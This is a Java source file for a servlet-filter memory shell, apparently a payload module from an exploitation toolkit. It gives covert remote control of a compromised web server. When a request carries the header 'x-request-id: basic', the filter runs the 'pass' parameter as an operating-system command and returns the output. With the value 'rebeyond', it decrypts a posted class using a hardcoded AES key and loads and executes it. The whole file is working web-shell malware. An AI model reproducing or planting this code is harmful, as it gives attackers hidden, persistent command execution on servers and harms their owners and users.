package http.payloads.memshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Scanner;

public class DynamicFilter implements Filter {
    private static final String FLAG_HEADER = "x-request-id";
    private static final String CMD_PARAM = "pass";
    private static final String REBEYOND_KEY = "e45e329feb5d925b";

    public DynamicFilter() {
        super();
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void doFilter(
            ServletRequest servletReq,
            ServletResponse servletResp,
            FilterChain filterChain
    ) throws IOException, ServletException {

        if (getFlagHeader(servletReq).equalsIgnoreCase("basic")) {
            String cmd = servletReq.getParameter(CMD_PARAM);
            if (cmd != null && !cmd.isEmpty()) {
                String[] cmds;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    cmds = new String[]{"cmd", "/C", cmd};
                } else {
                    cmds = new String[]{"/bin/sh", "-c", cmd};
                }
                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                servletResp.getWriter().println(result);
            }
        } else if (getFlagHeader(servletReq).equalsIgnoreCase("rebeyond")) {
            try {
                if (((HttpServletRequest) servletReq).getMethod().equals("POST")) {
                    ((HttpServletRequest) servletReq).getSession().setAttribute("u", REBEYOND_KEY);
                    Cipher cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((((HttpServletRequest) servletReq).getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal(Base64.getDecoder().decode(servletReq.getReader().readLine()));
                    Class evilClass = (Class) Class.forName("java.lang.ClassLoader")
                            .getDeclaredMethod("defineClass", byte[].class, int.class, int.class)
                            .invoke(Thread.currentThread().getContextClassLoader(), evilClassBytes, 0, evilClassBytes.length);
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", ServletRequest.class, ServletResponse.class);
                    targetMethod.invoke(evilObject, servletReq, servletResp);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (getFlagHeader(servletReq).equalsIgnoreCase("godzilla")) {
            // TODO: support Godzilla memory shell
            filterChain.doFilter(servletReq, servletResp);
        } else {
            filterChain.doFilter(servletReq, servletResp);
        }
    }

    private String getFlagHeader(ServletRequest req) {
        return ((HttpServletRequest) req).getHeader(FLAG_HEADER);
    }

    @Override
    public void destroy() {
    }
}
